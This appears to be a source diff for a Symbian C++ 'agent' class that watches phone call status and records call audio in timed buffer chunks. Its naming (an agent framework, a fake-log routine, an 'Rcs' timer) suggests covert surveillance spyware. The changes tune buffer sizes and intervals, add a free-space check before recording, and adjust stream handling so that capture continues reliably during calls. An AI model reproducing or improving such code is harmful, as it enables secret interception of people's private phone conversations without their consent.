@@ -19,7 +19,7 @@ _LIT8(KFake,"\xff\xff\xff\xff");
 _LIT(KLocal,"Local");
 
 CAgentCallLocal::CAgentCallLocal() :
-CAbstractAgent(EAgent_CallLocal),iInCall(EFalse),iRecState(ENotReady),iMicrosecInterval(600000)
+CAbstractAgent(EAgent_CallLocal),iInCall(EFalse),iRecState(ENotReady),iMicrosecInterval(500000)
 	{
 	// No implementation required
 	}
@@ -66,12 +66,16 @@ void CAgentCallLocal::ConstructL(const TDesC8& params)
 		
 	BaseConstructL(params);
 	
+	// agent parameters are not used
+	/*
 	TUint8* ptr = (TUint8 *)iParams.Ptr();
 	Mem::Copy( &iBuffSize, ptr, 4);
-	iBuffSize=8000;  //we need smaller buffers 
 	ptr += 4;
 	Mem::Copy(&iCompression,ptr,4 );
+	*/
 	
+	//we don't consider agent parameters coz we need smaller buffers
+	iBuffSize=5984; 
 	
 	iCallMonitor = CPhoneCallMonitor::NewL(*this);
 	iTimer = CHighResTimeoutTimer::NewL(*this,EPriorityHigh); //EPriorityUserInput,EPriorityHigh
@@ -104,7 +108,12 @@ void CAgentCallLocal::StartAgentCmdL()
 	//we have to check if we are in call, maybe we've been called by an event call...
 	TBuf<16>  telNumber;
 	TInt direction;
-	if(iCallMonitor->ActiveCall(direction,telNumber))
+	
+	//we have to check if we have enough space
+	TInt value;
+	RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+					
+	if((iCallMonitor->ActiveCall(direction,telNumber)) && value)
 		{
 		
 		TInt size = telNumber.Size();
@@ -153,7 +162,6 @@ void CAgentCallLocal::StartAgentCmdL()
 
 void CAgentCallLocal::StopAgentCmdL()
 	{
-	
 	iTimer->Cancel();
 	iCallMonitor->Cancel();
 	
@@ -235,10 +243,13 @@ void CAgentCallLocal::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 		
 	if (aError==KErrNone && iInputStream) 
 	    {
-		if (&aBuffer==iStreamBufferArray[0])
+		if(iInCall)
+			{
+			if (&aBuffer==iStreamBufferArray[0])
 		        iInputStream->ReadL(*iStreamBufferArray[0]);
 		    else
 		    	iInputStream->ReadL(*iStreamBufferArray[1]);
+			}
 		if(aBuffer.Length())
 			{
 			iRecData->Des().Append(aBuffer);
@@ -321,11 +332,11 @@ void CAgentCallLocal::MaiscRecordComplete(TInt aError)
     else if(aError == KErrDied)  //KErrDied = -13
     	{
     	//DevSound resource conflict
- 
+    	iInputStream->Stop();
     	}
     else //KErrUnderflow, KErrOverflow, KErrAccessDenied, 
         {
-    	
+    	iInputStream->Stop();
         } 
     }
 
@@ -347,8 +358,10 @@ void CAgentCallLocal::WriteFakeLogL()
 // aNumber.Length()==0  when private number calling
 void CAgentCallLocal::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirection,const TDesC& aNumber)
 	{
-	
-	if(!iInCall)  //coz this could be a second call: a conference or second call after holding the first one
+	TInt value;
+	RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+					
+	if(!iInCall && value)  //coz this could be a second call: a conference or second call after holding the first one
 		{
 		TInt size = aNumber.Size();
 		iInCall = ETrue;
@@ -390,20 +403,23 @@ void CAgentCallLocal::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDir
 void CAgentCallLocal::NotifyDisconnectedCallStatusL()
 	{
 	iInCall = EFalse;
-	iInputStream->Stop();
-	//WriteFakeLogL();
+	// we don't need to stop the timer, we simply don't start it again in HighResTimerExpiredL
+	// we don't need to stop the stream, it's the first thing we do in HighResTimerExpiredL()
+	//iTimer->Cancel();  
+	//iInputStream->Stop();
 	}
 
 
 void CAgentCallLocal::NotifyDisconnectingCallStatusL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration, const TDesC& aNumber)
 	{
+	
 	}
 
 void CAgentCallLocal::HighResTimerExpiredL(TAny* src)
 	{
+	iInputStream->Stop();
 	if(iInCall)
 		{
-		iInputStream->Stop();
 		iInputStream->ReadL(*iStreamBufferArray[0]);
 		iInputStream->ReadL(*iStreamBufferArray[1]);
 		iTimer->RcsHighRes(iMicrosecInterval);
